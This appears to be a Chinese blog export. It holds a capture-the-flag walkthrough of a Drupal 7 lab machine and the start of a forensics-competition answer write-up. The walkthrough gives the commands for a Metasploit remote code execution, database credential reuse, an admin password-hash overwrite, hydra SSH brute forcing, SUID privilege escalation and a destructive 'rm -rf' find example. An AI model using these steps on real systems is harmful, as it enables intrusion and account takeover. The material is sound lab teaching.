的包，如果有响应，则表明目标处于活动状态；</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028564.png" alt="image-20231117174059741"></p><p>找到靶机ip是<code>192.168.160.146</code></p><p>接下来 在使用nmap探靶机开放的端口</p><pre><code>nmap -T4 -sC -sV 192.168.160.146 或 nmap -A -p- -v 192.168.160.146-sV 参数：探测端口上运行的软件；-A 详细扫描-T4 设定时间强度</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028986.png" alt="image-20231031194656572"></p><pre><code>开放了22端口 存在ssh服务 OpenSSH版本6.0p1开放了80端口 存在web服务 使用apche httpd版本2.2.22 使用了Drupal7(CMS开源框架 使用php语言编写)开放了111端口 存在rpcbind服务器</code></pre><p>这一步的操作使用</p><pre><code>whatweb -v 192.168.160.146</code></pre><p>也可以进行CMS识别</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028780.png" alt="image-20231031195321754"></p><h3 id="二-信息分析"><a href="#二-信息分析" class="headerlink" title="二.信息分析"></a>二.信息分析</h3><p>开启了ssh服务 也许有弱口令 可以尝试爆破</p><p>Drupal有公开的RCE漏洞 可以尝试进行验证利用</p><h3 id="三-访问web站点"><a href="#三-访问web站点" class="headerlink" title="三.访问web站点"></a>三.访问web站点</h3><p>访问刚刚扫出来的web站点 是Drupal</p><pre><code>192.168.160.146</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028740.png" alt="image-20231031200028158"></p><p>使用<code>wappalyzer</code>插件查看网站的相关配置 发现和刚刚扫出来的配置是一样的</p><h3 id="四-利用MSF-msfconsole-进行渗透"><a href="#四-利用MSF-msfconsole-进行渗透" class="headerlink" title="四.利用MSF(msfconsole)进行渗透"></a>四.利用MSF(msfconsole)进行渗透</h3><h4 id="1-msfconsole命令介绍"><a href="#1-msfconsole命令介绍" class="headerlink" title="1.msfconsole命令介绍"></a>1.msfconsole命令介绍</h4><pre><code>msfconsole进入MSF控制台search 搜索相应模块use           对应模块show options  查看信息set RHOST  设置远程主机iprun           攻击(启动模块)host            查看扫描记录back  停止攻击(退出模块)save保存模块配置show exploits/payloads  查看所有攻击模块/查找所有攻击载荷</code></pre><h4 id="2-搜索Drupal7漏洞"><a href="#2-搜索Drupal7漏洞" class="headerlink" title="2.搜索Drupal7漏洞"></a>2.搜索Drupal7漏洞</h4><h5 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h5><p>先使用<code>searchsploit Drupal 7</code>搜索一下Drupal 7的漏洞 可以找到很多</p><p><a href="https://blog.csdn.net/qq_63844103/article/details/128405733?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169875595316800184165844%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169875595316800184165844&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-128405733-null-null.142%5Ev96%5Epc_search_result_base9&utm_term=searchsploit&spm=1018.2226.3001.4187">searchsploit使用介绍</a></p><pre><code>Exploit-db是Kali linux 官方团队维护的一个安全项目，存储了大量的漏洞利用程序，是公认的世界上最大的搜集漏洞的数据库。它的在线版本是https://www.exploit-db.com/ 。而searchsploit可以利用exploit-db提供的数据库进行离线搜索</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028525.png" alt="image-20231031204251110"></p><p>过滤一下 是7版本的漏洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028910.png" alt="image-20231031204347126"></p><h4 id="3-使用msfconsole扫exp"><a href="#3-使用msfconsole扫exp" class="headerlink" title="3.使用msfconsole扫exp"></a>3.使用msfconsole扫exp</h4><p>msfconsole命令简单介绍</p><pre><code>msfconsole进入MSF控制台search *搜索相应模块use *          对应模块show options  查看信息set RHOST  远程主机iprun           攻击show info       查看模块的详细信息</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311052139678.png" alt="image-20231105213954599"></p><h5 id="搜索drupal模块"><a href="#搜索drupal模块" class="headerlink" title="搜索drupal模块"></a>搜索drupal模块</h5><pre><code>search drupal</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311052141123.png" alt="image-20231105214125065"></p><h5 id="选中模块"><a href="#选中模块" class="headerlink" title="选中模块"></a>选中模块</h5><p>发现模块1是远程命令执行漏洞 使用模块1搞一下</p><pre><code>use 1show options   查看详细信息</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028193.png" alt="image-20231117171533101"></p><h5 id="设置靶机ip运行msf"><a href="#设置靶机ip运行msf" class="headerlink" title="设置靶机ip运行msf"></a>设置靶机ip运行msf</h5><pre><code>set RHOST 192.168.160.146  设置靶机iprun                        开始攻击</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028889.png" alt="image-20231117182012241"></p><h4 id="4-进入shell"><a href="#4-进入shell" class="headerlink" title="4.进入shell"></a>4.进入shell</h4><p>exp运行成功 我们进入shell</p><pre><code>shell</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028025.png" alt="image-20231117183849319"></p><h4 id="5-flag1"><a href="#5-flag1" class="headerlink" title="5.flag1"></a>5.flag1</h4><p>进入目录 找到flag1</p><pre><code>lscat flag1.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028574.png" alt="image-20231117183914026"></p><pre><code>Every good CMS needs a config file - and so do you.翻译：每个优秀的内容管理系统(CMS)都需要配置文件，你也一样。</code></pre><h4 id="6-flag2"><a href="#6-flag2" class="headerlink" title="6.flag2"></a>6.flag2</h4><p>flag1的内容提示我们寻找配置文件 </p><p>我们先使用python反弹一个交互式shell</p><pre><code>python -c &#39;import pty; pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028712.png" alt="image-20231117185938351"></p><p>gpt做题法</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311212113951.png" alt="image-20231117190400954"></p><p>找到<code>/var/www/sites/default/settings.php</code> 查看内容 找到flag2 还找到了数据库的配置文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028770.png" alt="image-20231117190903810"></p><pre><code>flag2Brute force and dictionary attacks aren&#39;t theonly ways to gain access (and you WILL need access).What can you do with these credentials?翻译：爆破和字典攻击并不是获得访问权限的唯一方式(你需要访问权限) 你能用这些证书做什么</code></pre><h4 id="7-flag3"><a href="#7-flag3" class="headerlink" title="7.flag3"></a>7.flag3</h4><h5 id="进入数据库"><a href="#进入数据库" class="headerlink" title="进入数据库"></a>进入数据库</h5><p>flag2提示我们提升权限不能靠爆破和字典攻击  不知道上面提到的证书是什么意思</p><p>但是我们知道数据库的信息了 就先看一下数据库</p><pre><code>mysql -udbuser -pEnter password: R0ck3t</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028662.png" alt="image-20231117192340717"></p><p>进入后 查数据库 查表 查字段 查内容  </p><pre><code>show databases;use drupaldb;show tables;show columns from users;select name,pass from users;</code></pre><p>可以找到admin用户的密码  但是一看就是加盐了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029072.png" alt="image-20231117200258507"></p><p>没关系 直接改成弱密码<code>123456</code>就行了</p><p>但是再次之前 我们需要找到他的加密脚本 将加盐加密的<code>123456</code>放入数据库中</p><p>在&#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028085.png" alt="image-20231117205111604"></p><pre><code>$S$D/ckVXyCs7v65HPpFO/zG93O33n/wdyqQF7po2sOp07Dw5/I6X/P</code></pre><p>再次进入数据库 更改密码</p><pre><code>update users set pass=&#39;$S$D/ckVXyCs7v65HPpFO/zG93O33n/wdyqQF7po2sOp07Dw5/I6X/P&#39; where name=&#39;admin&#39;;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028637.png" alt="image-20231117213946445"></p><h5 id="登入网页"><a href="#登入网页" class="headerlink" title="登入网页"></a>登入网页</h5><p>使用<code>admin/123456</code>成功登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029321.png" alt="image-20231117214115213"></p><p>翻找网页内容 找到flag3</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029896.png" alt="image-20231117214212927"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029358.png" alt="image-20231117214430542"></p><pre><code>flag3Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.翻译：特殊的权限可以帮助找到密码，但你需要执行该命令才能知道如何获取shadow中的内容。</code></pre><h4 id="8-flag4"><a href="#8-flag4" class="headerlink" title="8.flag4"></a>8.flag4</h4><p>在&#x2F;home文件夹中找到flag4</p><pre><code>flag4Can you use this same method to find or access the flag in root?                                                                                                                                                                                                 Probably. But perhaps it&#39;s not that easy.  Or maybe it is?翻译：你能用同样的方法找到或访问 root 中的flag吗？                                                                                                                                                                                                也许可以。但也许没那么容易。 又或许可以？</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191627932.png" alt="image-20231119162704880"></p><p>flag3中提到shadow文件 但是一般情况来讲 查看shadow文件都需要使用root权限</p><p>我们可以看到 现在是www-data权限 查看shadow文件 权限不够</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029539.png" alt="image-20231118204944510"></p><p>但是我们可以查看passwd文件 可以看到确实是有flag4这个用户</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191631172.png" alt="image-20231119163126120"></p><h5 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h5><p>这里学到一点 可以尝试使用hydra进行密码爆破 这里我们使用password.lst字典进行爆破</p><pre><code>hydra -l flag4 -P /home/kali/Desktop/brutehash/password.lst ssh://192.168.160.146-l 指定用户名-P 加载密码字典（自定义)ssh://ip 指定使用协议和ip地址</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191723636.png" alt="image-20231119172333588"></p><p>爆破出flag4的密码是<code>orange</code> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191724043.png" alt="image-20231119172417992"></p><p>登录成功 拿到flag4权限</p><h4 id="9-thefinalflag"><a href="#9-thefinalflag" class="headerlink" title="9.thefinalflag"></a>9.thefinalflag</h4><h5 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h5><p>由flag4的提示  我们得知在&#x2F;root文件夹中还有一个flag  但是我们现在并没有root权限 </p><p>由flag3的内容当作提示 我们想到需要进行权限的提升   在提示中提到了<code>-exec</code>命令 想到suid提权 在这里我们使用find命令</p><h6 id="suid"><a href="#suid" class="headerlink" title="suid"></a>suid</h6><pre><code>suid是一种对二进制程序(我们执行的命令就是一种二进制程序)设置的特殊权限 设置了suid权限的程序 在用户执行该程序时 用户的权限是该程序属主的权限 如果程序属主是root权限 那么执行该程序的用户就将暂时获得root权限要注意：1. SUID权限只能设置二进制文件2. 命令执行者要有二进制文件的执行权3. 命令执行者执行二进制文件时会获得该程序的属主身份4. SUID权限只在程序执行中有效</code></pre><h6 id="find"><a href="#find" class="headerlink" title="find"></a>find</h6><pre><code>一、按名称或正则表达式查找文件格式：find . -name test.txt     // .符号代表路径 test.txt的位置放想要查找的文件名字find . -name &quot;*.txt&quot;           // 使用正则表达式 查找所有txt文件find . -type f -name &quot;*.txt&quot;   // 最好还是使用-type指定查找普通文件 以使所有内容更清晰// -type参数的一些用法字母文件类型bblock (buffered) specialccharacter (unbuffered) specialddirectory（目录）pnamed pipe (FIFO)（命名管道）lsymbolic link; this is never true if the -L option or the -follow option is in effect, unless the symbolic link is broken.       If you want to search for symbolic links when -L is in effect, use -xtype. （软连接；如果-L或者-follow选项生效，这个字母就不能用，除非     软连接断开了。如果你想在-L生效的时候，搜索软连接，使用-xtype选项）fregular file（普通文件）ssocketDdoor (Solaris)//二、查找不同类型的文件我们可以使用不同的-type参数 来查找不同类型的文件 find . -type d -name &quot;w3n*&quot;    // 使用 d 参数 查找所有名字中含有 w3n 的目录find . -type l -name &quot;w3n*&quot;    // 使用 l 参数 查找所有名字中含有 w3n 的符号链接三、按特定的时间戳查找文件linux中三种不同的时间戳：访问时间戳(atime)：最后一次读取文件的时间修改时间戳(mtime)：文件内容最后一次修改时间更改时间戳(ctime)：上次更改文件元数据的时间 例如所有权、位置、文件类型等+ 是大于 -是小于find . -type f -atime +365    // 查找最后一次访问时间超过一年的文件find . -type f -mtime 5       // 查找最后一次修改时间为5天前的文件find . -type f -ctime +5 -ctime -10  // 查找上次更改元数据时间为5到10天前的文件四、按大小查找文件-size参数可以帮助我们按照文b: 512 字节（默认）c: 字节w: 两字节字k: 千字节M: 兆字节G: 千兆字节件大小来进行查找find . -type f -size +10M -size -1G   // 查找文件大小大于10M 小于1G的文件五、按权限查找文件-perm可以帮助我们按特定权限查找文件//常见的权限数字444 r--r--r--600 rw-------644 rw-r--r--666 rw-rw-rw-700 rwx------744 rwxr--r--755 rwxr-xr-x777 rwxrwxrwx从左至右，1-3位数字代表文件所有者的权限，4-6位数字代表同组用户的权限，7-9数字代表其他用户的权限。读取权限：等于4 用 r 表示写入权限：等于2 用 w 表示执行权限：等于1 用 x 表示eg.755 7: 4+2+1 文件所有者拥有读取、写入、执行权限5：4+0+1 同组用户拥有读取、执行权限5:4+0+1 其他用户拥有读取、执行权限//find . -type f -perm 777   // 查找所有具有777权限的文件 这意味着这些文件对其所有者、组和所有用户具有所有的读、写和可执行权限六、按所有权查找文件-user可以让我们按照所有权查找文件find . -type f -user w3nx1z1  // 查找所有所有权是w3nx1z1的文件七、找到文件后执行命令使用-exec在Linux中，exec是一个用于替换当前进程的系统调用 当一个进程调用exec时，它会被一个新的程序所替代，而新程序将从其main函数或入口点开始执行。这意味着原始进程的代码、数据和堆栈都会被新程序的相应部分所取代，从而实现了进程的自我替换。在使用-exec命令时 必须要注意严格遵守以下格式： -exec 命令 &#123;&#125; \;find . -type f -atime +5 -exec ls &#123;&#125; \;    // 查找所有最后访问时间超过5天的文件 并将其列出find . -type f -atime +365 -exec rmm -rf &#123;&#125; \;  // 查找所有最后访问时间超过一年的文件 并将其删除find /etc -type f -name &quot;passwd&quot; -exec grep &quot;root&quot; &#123;&#125; \;   // 查找在/etc文件夹下名为&quot;passwd&quot;的文件 并使用grep查找其中是否有名为&quot;root&quot;的用户</code></pre><p>现在我们已经了解了一点关于suid提权的基本内容 再来看一下suid提权的具体操作</p><h6 id="设置-x2F-去掉suid"><a href="#设置-x2F-去掉suid" class="headerlink" title="设置&#x2F;去掉suid"></a><strong>设置&#x2F;去掉suid</strong></h6><pre><code>chmod u+s filename 设置suid位chmod u-s filename 去掉suid位</code></pre><h6 id="查找suid"><a href="#查找suid" class="headerlink" title="查找suid"></a><strong>查找suid</strong></h6><pre><code>find / -type f -perm -u=s(或者-4000) 2&gt;/dev/null</code></pre><h6 id="find命令提权"><a href="#find命令提权" class="headerlink" title="find命令提权"></a><strong>find命令提权</strong></h6><p>如果find命令不是suid权限 先给find命令设置suid权限</p><pre><code>chmod u+s /bin/usr/find</code></pre><p>进行提权</p><pre><code>find 已有文件名 -exec whoami \;</code></pre><h6 id="vim命令提权"><a href="#vim命令提权" class="headerlink" title="vim命令提权"></a><strong>vim命令提权</strong></h6><p>赋予vim suid权限</p><pre><code>chmod u+s /bin/vim</code></pre><p>使用vim在&#x2F;etc&#x2F;sudoers中创建一个用户</p><pre><code>vim /etc/sudoers</code></pre><p>格式和root用户一样</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191551346.png" alt="image-20231119155142302"></p><pre><code>su - testsudo bashwhoami</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191552665.png" alt="image-20231119155218610"></p><h6 id="cp命令提权"><a href="#cp命令提权" class="headerlink" title="cp命令提权"></a><strong>cp命令提权</strong></h6><p>同样 先赋予&#x2F;usr&#x2F;bin&#x2F;cp suid权限</p><pre><code>chmod u+s /usr/bin/cp</code></pre><p><font color='red'>拥有suid权限的程序会由rwx变为rws</font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191558309.png" alt="image-20231119155819258"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191558944.png" alt="image-20231119155852911"></p><p>使用cp将&#x2F;etc&#x2F;passwd复制到当前用户的文件夹下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191613289.png" alt="image-20231119161306240"></p><p>使用openssl生成一个密码 </p><pre><code>openssl passwd -1 -salt 1*2*3 abcd   // passwd参数代表生成一个密码，-1为md5,-salt指定盐(随意),最后要跟加密的值，也就是密码</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191614387.png" alt="image-20231119161458344"></p><p>使用vim编辑.&#x2F;passwd 创建一个新用户 并将密码添加在其中 使用过<code>:wq!</code>强制保存</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191609597.png" alt="image-20231119160909564"></p><p>再将这个.&#x2F;passwd复制回原来的位置 </p><pre><code>cp ./passwd /etc/passwd</code></pre><p>此时在<code>su abc</code>输入密码<code>abcd</code>就是root用户了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191620814.png" alt="image-20231119162038742"></p><p>那么接下来 就使用find命令对靶场进行提权</p><p>首先使用find命令查找拥有suid权限的程序   在根目录下执行以下命令 </p><pre><code>find / -type f -perm -u=s 2&gt;dev/null</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191342964.png" alt="image-20231119134236870"></p><p>发现find命令是有suid权限的 那么我们就可以使用find来进行suid提权了</p><pre><code>find / -type f -exec /bin/sh \;whoami</code></pre><p>成功root</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029127.png" alt="image-20231119181109107"></p><p>进入&#x2F;root文件夹 找到<code>thefinalflag.txt</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029423.png" alt="image-20231119181153026"></p><pre><code>thefinalflag.txtWell done!!!!Hopefully you&#39;ve enjoyed this and learned some new skills.You can let me know what you thought of this little journeyby contacting me via Twitter - @DCAU7</code></pre><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>至此，靶场中的全部flag完全拿到了</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年美亚杯团体赛</title>
      <link href="/2023/10/29/2022%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E4%BD%93%E8%B5%9B/"/>
      <url>/2023/10/29/2022%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E4%BD%93%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="2022年美亚杯团体赛"><a href="#2022年美亚杯团体赛" class="headerlink" title="2022年美亚杯团体赛"></a>2022年美亚杯团体赛</h1><h2 id="AGC计算机"><a href="#AGC计算机" class="headerlink" title="AGC计算机"></a>AGC计算机</h2><h3 id="31"><a href="#31" class="headerlink" title="31."></a>31.</h3><pre><code>[单选题] 分析AGC-CS计算机 (Computer) 里最初的作業系統 (Windows) ，它的实際安装时间是什么? (以时区UTC+8回答) (3分)A. 2022-09-26 14:35:17B. 2022-09-26 21:35:17C. 2022-09-27 05:35:17D. 2022-10-05 03:52:15E. 2022-10-05 11:52:15</code></pre><pre><code>D</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170917381.png" alt="image-20231029161714704"></p><h3 id="32"><a href="#32" class="headerlink" title="32"></a>32</h3><pre><code>[单选题] AGC-CS计算机里的 ‘Acrobat DC’ 软件的安装时间是? (以时区UTC+8回答) (如答案为 2022-12-29 16:01:59，需回答 20221229160159) (1分)A. 2022-09-28 19:01:40B. 2022-09-28 07:18:33C. 2022-08-30 19:01:40D. 2022-08-30 07:18:33</code></pre><pre><code>A</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170917864.png" alt="image-20231029183709043"></p><p>火眼只能分析出第二个安装时间 但是不是选项 取证大师能分析出两个 选和选项差不多的第一个时间</p><h3 id="33"><a href="#33" class="headerlink" title="33"></a>33</h3><pre><code>[单选题]AGC-CS计算机里的用户 &#39;Carson&#39; 链接了一个网络磁盘机 (Network Drive)，在下列哪一个档案有相关资料? (2分)A. \Users\Carson\NTUSER.DATB. \Users\admin\NTUSER.DATC. \Windows\System32\config\SYSTEMD. \Windows\System32\config\SOFTWAREE. \Windows\System32\config\SECURITY</code></pre><pre><code>A</code></pre><p>根据34题 得知这个网络磁盘机是通过ip地址连接的 直接找ip 在跳转源文件就找到了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170917752.png" alt="image-20231029190348751"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918559.png" alt="image-20231029190830635"></p><h3 id="34"><a href="#34" class="headerlink" title="34"></a>34</h3><pre><code> [单选题] 承上题，用户 ‘Carson’ 连接的网络磁盘机的IP地址是什么? (1分)A. \192.168.182.134B. \192.168.182.134\photoC. \192.168.182.134\shareD. \192.168.182.134\AGCE. \192.168.182.134\AGC photo</code></pre><p>接上题</p><pre><code>C</code></pre><h3 id="35"><a href="#35" class="headerlink" title="35"></a>35</h3><pre><code>[填空题] 分析计算机里的电邮数据，当中包含嫌疑人王景浩可能的居住地址，请回答他住址的楼层 (以阿拉伯数字回答) (1分)</code></pre><pre><code>45</code></pre><p>在邮件附件的账单中 找到一个地址</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918598.png" alt="image-20231029191313442"></p><h3 id="36"><a href="#36" class="headerlink" title="36"></a>36</h3><pre><code>[填空题] 承上题，王景浩使用的信用卡号码最后四位数字是? (1分)</code></pre><pre><code>6717</code></pre><p>在邮件中找到一张信用卡照片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918852.png" alt="image-20231029191554938"></p><h3 id="37"><a href="#37" class="headerlink" title="37"></a>37</h3><pre><code>[填空题] AGC-CS计算机用户 ‘Carson’ 曾经收到一个电邮并通过里面的链结下载了一个可疑的 ‘Word’ 文件，那个档案的档案名是什么? (不要输入 ‘.’，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG) (1分)</code></pre><pre><code>KEFMUONDOCX</code></pre><p>在收件箱中找到下载地址 尝试访问 但是无法访问QAQ</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918012.png" alt="image-20231029193908164"></p><p>既然是下载的 那应该在用户的Download文件夹下 应该能找到一些东西</p><p>在文件分析中 找word文档 找到一个在download文件夹下的文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918990.png" alt="image-20231029194630321"></p><h3 id="38"><a href="#38" class="headerlink" title="38"></a>38</h3><pre><code>[单选题] 承上题，分析该 ‘Word’ 文件，它的可能用途是? (3分)A. 访问一个网站B. 记录键盘操作C. 把档案加密D. 改变桌面壁纸E. 关闭计算机</code></pre><pre><code>A</code></pre><p>接上题 发现是一个可疑文件 放到云沙箱里面看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918151.png" alt="image-20231029195242723"></p><p>bcde选项的行为都没找到 看到一个和a选项很相关的行为</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918715.png" alt="image-20231029195343332"></p><h3 id="39"><a href="#39" class="headerlink" title="39"></a>39</h3><pre><code>[单选题] AGC-CS计算机里有一个名为 ‘admin’ 的用户，它是在何时被建立的? (以时区UTC+8回答) (1分)A. 2022-09-28B. 2022-09-29C. 2022-09-30D. 2022-10-01E. 以上皆非</code></pre><pre><code>B</code></pre><p>直接翻日志 在日志分析——安全——账户管理中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918792.png" alt="image-20231029200259035"></p><h3 id="40"><a href="#40" class="headerlink" title="40"></a>40</h3><pre><code>[填空题] 黑客第一次采用用户 ‘admin’ 通过远程桌面协议 (Remote Desktop Protocol - RDP) 登录了AGC-CS计算机的时间是? (以时区UTC+8回答) (如答案为 2022-12-29 16:01:59，需回答 20221229160159) (2分)</code></pre><pre><code>20220929204102</code></pre><p>用户要在创建之后才能登陆 由上题 admin在<code>2022-09-29 20:41:02</code>才被创建成功 找到登陆&#x2F;注销日志  发现在创建之后 就使用显示凭据登录了 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918438.png" alt="image-20231029204150657"></p><p>在账户登陆中 也可以看到 同时在网络地址中 也能看到登陆的ip并不是本地ip 也能证实是通过远程桌面协议登陆的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918892.png" alt="image-20231029204714875"></p><h3 id="41"><a href="#41" class="headerlink" title="41"></a>41</h3><pre><code>[填空题] 黑客入侵AGC-CS计算机后下载了一个扫描端口 (Port Scanning) 的软件，这软件的真正名称是? (以大写英文及阿拉伯数字回答) (3分)</code></pre><pre><code>PUTTY</code></pre><p>在安装软件里面找在admin账户创建之后下载安装的软件 只有这一个软件 经过download文件夹下载的 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918027.png" alt="image-20231029205804575"></p><p>或者直接在浏览器下载记录中查看 时间也符合</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918617.png" alt="image-20231029205904520"></p><p>搜一下这个软件能否进行端口扫描</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918560.png" alt="image-20231029205952432"></p><h3 id="42"><a href="#42" class="headerlink" title="42"></a>42</h3><pre><code>[填空题] 承上题，黑客采用上述软件取得一些计算机的IP地址及媒体访问控制地址 (‘Media Access Control’ Address - MAC Address) 并存到一个名为 ‘ip.txt’ 的档案。 当中 ‘192.168.182.130’ 计算机的MAC地址是什么? (不要输入 ‘：’ 或 ‘-’ ，以大写英文及阿拉伯数字回答) (3分)</code></pre><pre><code>9061AEC09045</code></pre><p>找到这个ip.txt 但是已经被删了 但是我们已经知道了 黑客就是王景浩 因此这个ip.txt也会传到王景浩的电脑中 在分析王景浩的电脑 找到ip.txt</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918187.png" alt="image-20231029212639655"></p><h3 id="43"><a href="#43" class="headerlink" title="43"></a>43</h3><pre><code>[填空题] AGC-CS计算机里的一个跳转列表 (Jumplist) 显示了用户 ‘admin’ 曾经采用记事本 (Notepad) 打开了一个文字档案，这个文字档的SHA-256哈希值是什么? (以大写英文及阿拉伯数字回答) (3分)</code></pre><pre><code>320A98F6519748D16B8870EF4D8A606D656C5A09CF2F660AA35EBF6495824CB1</code></pre><p>在最近访问的文档中 可以看到 使用notepad打开 且用户是admin的文档只有ip.txt</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918341.png" alt="image-20231029211800054"></p><h3 id="44"><a href="#44" class="headerlink" title="44"></a>44</h3><pre><code>[单选题] 黑客除了通过 ‘RDP’ 外，还采用什么软件远端控制 (Remote Control) AGC-CS计算机? (1分)A. VNCB. TeamviewerC. AnydeskD. Splashtop Business AccessE. RemotePC</code></pre><pre><code>B</code></pre><p>在AGC的电脑中可以看到很多Teamviewer的痕迹</p><h2 id="AGC服务器"><a href="#AGC服务器" class="headerlink" title="AGC服务器"></a>AGC服务器</h2><p>服务器是三个软raid 直接全部挂载分析不出东西 详细说一下重组的过程 分为两种方法：UFS和取证大师</p><h3 id="UFS"><a href="#UFS" class="headerlink" title="UFS"></a>UFS</h3><p>首先在UFS中打开三个镜像 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071510826.png" alt="image-20231107151033766"></p><p>全部打开后 就可以看到 已经识别组出原来的磁盘镜像<code>agc:0</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071513562.png" alt="image-20231107151352502"></p><p>下面直接进行导出即可 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071515340.png" alt="image-20231107151517284"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071515624.png" alt="image-20231107151526570"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071518716.png" alt="image-20231107151803656"></p><h3 id="取证大师"><a href="#取证大师" class="headerlink" title="取证大师"></a>取证大师</h3><p>先创建一个案例  添加三个镜像</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071551532.png" alt="image-20231107155124484"></p><p>自动识别出动态磁盘 勾选确定进行解析 </p><p>看到已经解析出raid重组后的盘来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071553552.png" alt="image-20231107155311504"></p><p>右键扫描磁盘结构 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071600263.png" alt="image-20231107160040217"></p><p>在制作镜像文件就行</p><h3 